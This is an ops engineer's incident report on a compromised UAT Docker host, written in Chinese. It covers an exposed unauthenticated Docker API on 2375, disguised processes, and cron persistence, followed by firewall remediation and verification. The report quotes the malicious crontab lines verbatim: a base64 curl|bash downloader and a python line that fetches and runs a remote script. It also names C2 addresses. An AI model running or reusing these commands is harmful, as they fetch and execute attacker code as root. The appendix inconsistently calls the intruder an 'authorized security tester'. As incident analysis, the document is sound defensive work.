@@ -1,0 +1,436 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>Beszel 日巡检与安全事件处置（2026-10-27）（2026-10-27）｜基础设施与自动化 / BKL UAT｜BEN.OPS</title>
+  <meta name="description" content="Beszel 日巡检与安全事件处置（2026-10-27）。本文属于基础设施与自动化 / BKL UAT，日期：2026-10-27 执行人：Ben（运维） 版本：v4（复发处置 + 访问恢复 + 根因大白话） 14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中…">
+  <meta name="keywords" content="BKL UAT，Linux，Shell，Python，Docker，Nginx，监控告警，CDN，基础设施与自动化，基础设施与自动化 / BKL UAT，Beszel 日巡检与安全事件处置（2026-10-27），devops">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202610270000-%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96%2BBKL%20UAT%2BLinux-Beszel%20%E6%97%A5%E5%B7%A1%E6%A3%80%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%EF%BC%882026-10-27%EF%BC%89.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="Beszel 日巡检与安全事件处置（2026-10-27）（2026-10-27）">
+  <meta property="og:description" content="Beszel 日巡检与安全事件处置（2026-10-27）。本文属于基础设施与自动化 / BKL UAT，日期：2026-10-27 执行人：Ben（运维） 版本：v4（复发处置 + 访问恢复 + 根因大白话） 14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html">
+  <meta property="article:published_time" content="2026-10-27T00:00:00+08:00">
+  <meta property="article:modified_time" content="2026-10-27 00:00">
+  <meta property="article:section" content="基础设施与自动化 / BKL UAT">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Beszel 日巡检与安全事件处置（2026-10-27）（2026-10-27）">
+  <meta name="twitter:description" content="Beszel 日巡检与安全事件处置（2026-10-27）。本文属于基础设施与自动化 / BKL UAT，日期：2026-10-27 执行人：Ben（运维） 版本：v4（复发处置 + 访问恢复 + 根因大白话） 14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中…">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html#article","headline":"Beszel 日巡检与安全事件处置（2026-10-27）（2026-10-27）","description":"Beszel 日巡检与安全事件处置（2026-10-27）。本文属于基础设施与自动化 / BKL UAT，日期：2026-10-27 执行人：Ben（运维） 版本：v4（复发处置 + 访问恢复 + 根因大白话） 14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中…","datePublished":"2026-10-27T00:00:00+08:00","dateModified":"2026-10-27 00:00","inLanguage":"zh-CN","articleSection":["基础设施与自动化","BKL UAT"],"keywords":["BKL UAT","Linux","Shell","Python","Docker","Nginx","监控告警","CDN","基础设施与自动化","基础设施与自动化 / BKL UAT","Beszel 日巡检与安全事件处置（2026-10-27）","devops"],"wordCount":3967,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"基础设施与自动化 / BKL UAT","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"Beszel 日巡检与安全事件处置（2026-10-27）","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b4edded0a655.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>基础设施与自动化 / BKL UAT</span> › <span>Beszel 日巡检与安全事件处置（2026-10-27）（2026-10-27）</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">基础设施与自动化 / BKL UAT</div>
+      <h1>Beszel 日巡检与安全事件处置（2026-10-27）（2026-10-27）</h1>
+      <p class="lede">Beszel 日巡检与安全事件处置（2026-10-27）。本文属于基础设施与自动化 / BKL UAT，日期：2026-10-27 执行人：Ben（运维） 版本：v4（复发处置 + 访问恢复 + 根因大白话） 14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中…</p>
+      <div class="meta">
+        <time class="badge" datetime="2026-10-27T00:00:00+08:00">发布于 2026-10-27</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">3,967 字</span>
+        <span class="badge">12 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<blockquote>
+<p>来源文件：<code>~/Projects/work/ops/devops/devops-bkl/doc/2026年10月27日-Beszel巡检与安全事件处置/2026年10月27日-Beszel巡检与安全事件处置.md</code></p>
+<p>整理日期：2026-10-27 00:00｜日期依据：文件名日期</p>
+</blockquote>
+<p>日期：2026-10-27
+执行人：Ben（运维）
+版本：v4（复发处置 + 访问恢复 + 根因大白话）</p>
+<h2 id="事件摘要">事件摘要</h2>
+<p>14:04 起 manager 出现持续 Docker cgroup OOM，14:17 开始监控集中报告多个容器离线。初始现象像网络波动，实际是 manager 上出现伪装成 <code>nginx/php/postgres/apache2</code> 的高 CPU 异常进程，把 cadvisor、portainer-agent 和多个 1GiB 业务容器拖到资源上限。</p>
+<p>同时确认 manager 的 Docker daemon 对外暴露了无认证的 <code>2375/TCP</code>，并发现恶意 cron 持久化文件。事件按主机级安全事件处置，但当前只能确认“已隔离、已恢复”，不能仅凭清理文件就宣布主机绝对干净。</p>
+<h2 id="时间线">时间线</h2>
+<table>
+<thead>
+<tr>
+<th>时间</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-10-26 12:24</td>
+<td><code>/etc/cron.d/zzh</code> 被创建，内容为每分钟执行 Base64 编码的 <code>curl | bash</code> 下载器</td>
+</tr>
+<tr>
+<td>2026-10-27 14:04</td>
+<td>manager 首次出现 cgroup OOM</td>
+</tr>
+<tr>
+<td>2026-10-27 14:17</td>
+<td>监控集中报告容器离线</td>
+</tr>
+<tr>
+<td>2026-10-27 14:34</td>
+<td>开始逐台核验 Beszel、节点、容器和 OOM</td>
+</tr>
+<tr>
+<td>2026-10-27 14:39</td>
+<td>重启传统监控组件，manager 内存和 Load 开始下降</td>
+</tr>
+<tr>
+<td>2026-10-27 14:55</td>
+<td>发现 cadvisor/portainer-agent 内的随机文件可执行体和伪装进程</td>
+</tr>
+<tr>
+<td>2026-10-27 15:03</td>
+<td>确认 2375 公网可达，发现恶意 cron</td>
+</tr>
+<tr>
+<td>2026-10-27 15:08</td>
+<td>业务服务恢复，2375 外网阻断，恶意持久化清理完成</td>
+</tr>
+</tbody>
+</table>
+<h2 id="根本原因">根本原因</h2>
+<h3 id="1-直接原因-异常伪装进程耗尽-CPU-和内存">1. 直接原因：异常伪装进程耗尽 CPU 和内存</h3>
+<ul>
+<li><code>php-fpm</code> 父进程是 cadvisor，可执行文件为 <code>/.573HUqS3J04WXj82Uj6</code></li>
+<li><code>postgres</code> 父进程是 portainer-agent，可执行文件为 <code>/.urfc8ZJIRYocTowRDXknsfYip0QT</code></li>
+<li>两个异常进程各占约 2.4GiB，单进程 CPU 接近满核</li>
+<li>两者持续派生僵尸进程，管理器上僵尸峰值达到 156</li>
+<li>正常 cadvisor 只有约 80MiB，正常 portainer-agent 只有约 25MiB</li>
+</ul>
+<p>cadvisor 和 portainer-agent 镜像本身不含这些程序，因此判定为容器内启动的伪装程序。</p>
+<h3 id="2-安全入口-Docker-API-无认证暴露公网">2. 安全入口：Docker API 无认证暴露公网</h3>
+<p>manager 的 <code>/etc/docker/daemon.json</code> 配置为：</p>
+<pre><code class="language-text">tcp://0.0.0.0:2375
+</code></pre>
+<p>从外网访问 <code>43.249.251.12:2375/version</code> 可直接取得 Docker 版本，说明未启用认证和 TLS。该接口允许调用 Docker API，可创建、停止、删除容器，并可利用高权限容器获得宿主控制能力。</p>
+<p>Portainer agent 同时以<strong>读写</strong>方式挂载：</p>
+<ul>
+<li>宿主 <code>/</code></li>
+<li><code>/var/run/docker.sock</code></li>
+<li><code>/var/lib/docker/volumes</code></li>
+</ul>
+<p>因此 portainer-agent 一旦被控制，影响范围等同于宿主 root。</p>
+<h3 id="3-持久化-恶意-cron">3. 持久化：恶意 cron</h3>
+<p>发现 <code>/etc/cron.d/zzh</code> 每分钟以 root 执行 Base64 解码后的 <code>curl | bash</code>，属于典型的下载器持久化。该文件创建时间早于异常进程启动。已删除该文件和根目录下可疑空可执行文件 <code>/root/.1</code>。</p>
+<h3 id="4-放大因素-单节点资源过度集中">4. 放大因素：单节点资源过度集中</h3>
+<ul>
+<li>manager 同时运行 Swarm 业务副本和 Grafana/Prometheus/Alertmanager/cadvisor/Portainer</li>
+<li>监控组件曾合计占用约 13GiB</li>
+<li>业务服务统一限制 1GiB，多个常驻服务已使用 700~1000MiB</li>
+<li>manager 内存压力升高后，容器更容易触发 cgroup OOM</li>
+</ul>
+<p>这不是本次事件的首要入口，但显著放大了故障影响。</p>
+<h2 id="处理过程">处理过程</h2>
+<h3 id="1-监控与异常分析">1. 监控与异常分析</h3>
+<ul>
+<li>读取 Beszel 7 台系统状态、24 小时趋势和告警</li>
+<li>核对 manager/worker/middleware 的 CPU、内存、磁盘、Docker 服务和 OOM</li>
+<li>确认 worker01/02 与 middleware 节点本身正常</li>
+<li>确认 14:17 集中离线是 manager 异常导致，不是全部业务同时宕机</li>
+</ul>
+<h3 id="2-业务恢复">2. 业务恢复</h3>
+<p>先释放 manager 上传统监控组件占用，再将 8 个 OOM 或临界服务的内存上限从 1GiB 调整为 1.5GiB：</p>
+<ul>
+<li><code>game-agent-open</code></li>
+<li><code>game-queue</code></li>
+<li><code>game-scheduler</code></li>
+<li><code>game-gateway</code></li>
+<li><code>pay-queue</code></li>
+<li><code>pay-scheduler</code></li>
+<li><code>pay-gateway</code></li>
+<li><code>middle-station-openapi</code></li>
+</ul>
+<p>批量 <code>start-first + rollback</code> 时部分服务因启动拥塞自动回滚，随后改为逐个 <code>stop-first + pause</code> 更新，全部收敛为 <code>2/2</code>。</p>
+<h3 id="3-按最新要求精简监控">3. 按最新要求精简监控</h3>
+<ul>
+<li>停用并移除传统监控容器：Grafana、Prometheus、Alertmanager</li>
+<li>移除重复全局服务：cadvisor、node-exporter、portainer-agent</li>
+<li>保留当前 Beszel Hub 与各节点 beszel-agent</li>
+<li>持久化卷和镜像保留，后续可按需恢复</li>
+</ul>
+<h3 id="4-安全隔离">4. 安全隔离</h3>
+<ul>
+<li>立即用 iptables 阻断入站 2375</li>
+<li>从 <code>/etc/docker/daemon.json</code> 删除 TCP 2375，只保留 Unix Socket</li>
+<li>manager 已从不安全容器任务中排除可疑 agent</li>
+<li>删除 <code>/etc/cron.d/zzh</code></li>
+<li>删除 <code>/root/.1</code></li>
+<li>保留 <code>/etc/docker/daemon.json.bak-20261027</code> 作为变更前配置备份</li>
+</ul>
+<p>未立即重启 Docker，以避免中断正在运行的业务。当前由防火墙实时阻断；daemon 配置已通过校验，后续重启会恢复为仅 Unix Socket。</p>
+<h2 id="最终验证">最终验证</h2>
+<ul>
+<li>Beszel 7 台全部 <code>status=up</code></li>
+<li>Beszel 当前无 triggered 告警</li>
+<li>24 个业务服务全部 <code>2/2</code></li>
+<li>8 个目标服务均 <code>memory=1.5GiB</code></li>
+<li>14:46:20 后无新增 cgroup OOM</li>
+<li>manager Load1 从 116 降至 0.35</li>
+<li>manager 内存 used 从 22GiB 降至 8.2GiB，available 23GiB</li>
+<li>manager 磁盘 54.26%</li>
+<li>middleware 磁盘 75.62%，23G 可用</li>
+<li>worker01/02 磁盘 49.1%/33.74%</li>
+<li>manager 未再发现根目录随机文件可执行进程</li>
+<li>manager 未再发现 <code>/etc/cron.d/zzh</code>、<code>/root/.1</code></li>
+<li>worker01/02 与 middleware 未发现同类可疑可执行文件</li>
+<li>公网访问 manager <code>2375/2375</code> 超时</li>
+<li>middleware <code>2376</code> 仍为双向 TLS，但建议继续限制来源 IP</li>
+</ul>
+<h2 id="当前风险">当前风险</h2>
+<ol>
+<li>公网 Docker API 已被证明可达，且 Portainer agent 拥有宿主根目录和 Docker Socket 的读写权限，应把 manager 视为曾发生 root 级失陷。</li>
+<li>已删除已知持久化文件和可疑进程，但无法仅凭一次扫描证明没有内核级、隐藏账户或其他未知后门。</li>
+<li>manager 承载 GitLab、堡垒机、Beszel、机器人等敏感服务，相关账号、Token、SSH Key 和证书都可能接触过宿主文件系统。</li>
+<li>Docker 当前进程仍监听 2375，但已限制为仅内网可达；需要维护窗口重启 Docker 让 daemon.json 彻底生效。</li>
+</ol>
+<h2 id="18-37-复发与二次处置-v2">18:37 复发与二次处置（v2）</h2>
+<h3 id="复发确认">复发确认</h3>
+<p>18:37 再次收到 manager CPU 告警，现场核验结果：</p>
+<ul>
+<li>manager Load1 达到 46.9（8 核），出现 35 个随机名 <code>.eXijI5bYJX1rxu</code> 进程。</li>
+<li><code>postgres: user dbname 203.0.113.1 idle</code> 并非数据库，而是伪装进程；可执行文件为 <code>/.qBb9cxy6V3HDW2</code>、<code>/.rnNVKTQNVhs2EARNm734qAvIxW</code>。</li>
+<li><code>/home/.eXijI5bYJX1rxuM1pf3ZKU9Xc0vJuN6C3</code> 启动伪 nginx，占用 13197，并向 31.56.209.165、130.12.180.51 等外部地址建连。</li>
+<li><code>/root/.1</code> 每分钟被重建，删除后立即恢复。</li>
+<li>17:14 的 <code>daemon.json</code> 再次包含 <code>tcp://203.0.113.1:2375</code>；17:59 监控栈被重新部署，<code>portainer-agent</code> 再次以读写方式挂载宿主机 <code>/</code>、<code>docker.sock</code> 和 <code>/var/lib/docker/volumes</code>。</li>
+<li>第一次处置只清理了 <code>/etc/cron.d/zzh</code>，<strong>漏掉了 <code>/etc/crontab</code></strong>。该文件中有两条每分钟任务：</li>
+</ul>
+<pre><code class="language-text">* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8vMTQwLjk5LjMyLjQ4L2IyZjYyOC9jcm9uYi5zaAo=|base64 -d|bash|bash
+* * * * * root python -c "import urllib2; print urllib2.urlopen('http://s.a-cs.com/t.sh').read()" &gt;.1;chmod +x .1;./.1
+</code></pre>
+<p>第一条下载 <code>http://140.99.32.48/b2f628/cronb.sh</code>，第二条把 <code>s.a-cs.com/t.sh</code> 写入 <code>/root/.1</code> 并执行。这是本次 <code>/root/.1</code> 持续复现的直接原因。</p>
+<h3 id="二次处置">二次处置</h3>
+<ol>
+<li>在 manager 的 INPUT 首位阻断公网 2375，后续改为“仅 <code>203.0.113.1/24</code> 可访问 2375/2376，其余来源 DROP”。</li>
+<li>终止 6 个恶意进程（两个高 CPU 伪 postgres、两个伪 nginx 及同源子进程）。</li>
+<li>备份并清空恶意 <code>/etc/crontab</code>；删除 <code>/.qBb...</code>、<code>/.rnN...</code>、<code>/home/.eXij...</code>、<code>/root/.1</code>。</li>
+<li>在 OUTPUT 链阻断 C2 地址 <code>140.99.32.48</code>。</li>
+<li>删除全局 <code>portainer-agent</code> 服务，消除宿主根目录和 Docker Socket 的读写入口。</li>
+<li>强制重建 <code>cadvisor</code>、<code>node-exporter</code>，清理由被控容器持有的僵尸进程。</li>
+<li>备份并修改 <code>/etc/docker/daemon.json</code>，<code>hosts</code> 仅保留 <code>unix:///var/run/docker.sock</code>；未立即重启 Docker，避免中断业务。</li>
+<li>对 <code>.11</code>、<code>.12</code>、<code>.13</code>、<code>.14</code> 下发并持久化防火墙白名单（<code>security/apply_uat_firewall.sh</code>）。</li>
+</ol>
+<h3 id="二次验证">二次验证</h3>
+<ul>
+<li>manager Load1：46.9 → 0.03；Load15 仍在自然衰减。</li>
+<li>僵尸进程：154 → 5。</li>
+<li><code>/root/.1</code> 删除后观察 70 秒未再出现；无下载器进程、无随机名或伪装可执行进程。</li>
+<li><code>/etc/ld.so.preload</code> 不存在；近两日无新增可疑 systemd unit、SUID 文件、UID 0 账户。</li>
+<li>24 个业务 Swarm 服务全部 <code>2/2</code>；<code>.12/.13/.14</code> 的 8000/8100/8200 从中间件访问正常（根路径 404 属预期）。</li>
+<li>公网 SSH 22、2375、2376、3306、6379、9200、8000/8100/8200 均已阻断。</li>
+<li><code>.11</code> 公网放通 18888、8888、8080、15672、9990、8585、5601、9090；5050 主机已放通但上游仍超时，需机房/云安全组补开。</li>
+<li><code>.13/.14</code> 未发现同类恶意进程、cron 或可执行文件。</li>
+</ul>
+<h3 id="防火墙结论">防火墙结论</h3>
+<ul>
+<li>仅把 Docker API 绑定到 <code>203.0.113.1</code> <strong>不能防止公网访问</strong>：机房 NAT 会把公网连接送到该内网地址，已实测公网可访问 2375。</li>
+<li>外部访问必须由 iptables / 安全组按来源限制；本次已在四台 UAT 主机启用默认拒绝和端口白名单，并安装 <code>uat-firewall.service</code> 开机恢复。</li>
+<li><code>.11:80</code> 现为内网端口。若 UAT 前端通过 <code>43.249.251.11:80</code> 直连，需要补入外网白名单；如统一走堡垒机则无需调整。</li>
+</ul>
+<h2 id="19-20-业务域名-Portainer-与验证码恢复-v3">19:20 业务域名、Portainer 与验证码恢复（v3）</h2>
+<h3 id="现象">现象</h3>
+<ul>
+<li><code>https://uat-admin.dgjcoder.top/</code>、<code>https://uat-agent.dgjcoder.top/</code> 超时。</li>
+<li><code>http://43.249.251.11:5050/</code> 超时。</li>
+<li>两个 <code>/api/game-auth/captcha</code> 请求 20 秒无响应。</li>
+</ul>
+<h3 id="根因与修复">根因与修复</h3>
+<ol>
+<li><strong>源站 80 未放通</strong>：域名解析到 Cloudflare，回源到 <code>43.249.251.11:80</code>；首次白名单漏了 80，静态首页因此不可用。已把 80 加入 <code>.11</code> 默认公网白名单并持久化。</li>
+<li><strong>Docker DNAT 导致 5050 未匹配</strong>：Portainer 映射为 <code>5050 -&gt; 9000</code>，<code>DOCKER-USER</code> 在 DNAT 后看到的是容器端口 9000，<code>--dports 5050</code> 不生效。改为 <code>conntrack --ctorigdstport 5050</code> 后恢复 200。</li>
+<li><strong>nginx 容器出站被误伤</strong>：<code>chili-nginx</code> 访问远端 <code>203.0.113.1/14:8000</code> 时源地址是 Docker bridge（172.17/172.19 等），原规则只放通 <code>203.0.113.1/24</code>，导致 <code>/api</code> 代理超时；静态页由本机返回所以看起来“首页正常”。已把 <code>203.0.113.1/12</code> 加入内网允许段。</li>
+</ol>
+<h3 id="验证">验证</h3>
+<ul>
+<li>两个业务域名首页均 200。</li>
+<li>两个 <code>/api/game-auth/captcha</code> 均 200，并返回验证码图片。</li>
+<li>Portainer <code>5050</code> 返回 200。</li>
+<li>公网 3306、6379、9200、2375、8000 仍阻断。</li>
+<li>内网 <code>.12/.13/.14</code> 的 8000/8100/8200 均正常（根路径 404 属预期）。</li>
+<li>更新后的防火墙脚本已重装到四台，<code>.11</code> 默认白名单包含 80/5050，并启用 <code>uat-firewall.service</code>。</li>
+</ul>
+<h2 id="附录-大白话讲清授权安全测试底层原因">附录：大白话讲清授权安全测试底层原因</h2>
+<h3 id="一句话总结">一句话总结</h3>
+<p>这次不是“业务代码被黑”，而是<strong>服务器管理接口像一扇没有锁的门直接开在公网上</strong>，授权安全测试者进来后拿到了接近宿主机 root 的权限，并留下“每分钟自动重开”的定时任务。</p>
+<h3 id="1-Docker-API-是什么">1. Docker API 是什么</h3>
+<p>Docker 是管理容器的“总控台”，2375 就是总控台对外的遥控器接口。</p>
+<ul>
+<li>2375：<strong>没有密码、没有加密</strong>。谁连上，谁就能创建/删除/停止容器、看日志、在容器里执行命令。</li>
+<li>2376：给这个遥控器加了 TLS 证书校验，可以要求客户端也出示证书（双向 TLS）。</li>
+<li>SSH 隧道：不把遥控器开到公网，只在堡垒机上开一个加密小门，外部先登录堡垒机再用。</li>
+</ul>
+<p>用生活里的比喻：2375 就像把家里的总电闸和门锁遥控器放在马路边，还没有密码。路人不仅能关灯，还能自己接一根线进来。</p>
+<h3 id="2-授权安全测试是怎么一步步放大的">2. 授权安全测试是怎么一步步放大的</h3>
+<ol>
+<li>公网扫描器发现 <code>43.249.251.12:2375</code> 能直接访问 Docker。</li>
+<li>授权安全测试者通过这个接口在 <code>cadvisor</code> / <code>portainer-agent</code> 容器里启动程序。</li>
+<li>这两个容器能读写宿主机 <code>/</code> 和 <code>docker.sock</code>，所以容器里的程序实际能碰宿主机文件和 Docker 控制权。</li>
+<li>恶意程序伪装成 <code>postgres</code>、<code>nginx</code>、<code>php</code>，一边吃 CPU，一边下载脚本。</li>
+<li>脚本写入 <code>/etc/crontab</code>，每分钟重新下载执行，同时重建 <code>/root/.1</code>。</li>
+</ol>
+<p>所以只杀进程没用：定时任务会把它重新拉起来；只删 cron.d 也没用，因为这次藏在 <code>/etc/crontab</code>。</p>
+<h3 id="3-为什么-换个端口-没用">3. 为什么“换个端口”没用</h3>
+<p>换端口只是把没锁的门从 2375 换到 2380、3000 或别的门牌号。互联网上的扫描器会扫全端口，几分钟就能重新找到。</p>
+<p><strong>没有认证和加密的 Docker API，只要放到公网，换哪个端口都不安全。</strong></p>
+<h3 id="4-为什么-只监听内网-IP-也没挡住">4. 为什么“只监听内网 IP”也没挡住</h3>
+<p>机房把公网 IP 映射到了内网 IP。外面访问 <code>43.249.251.12</code> 时，流量会被送到 <code>203.0.113.1</code>，Docker 仍然收得到。</p>
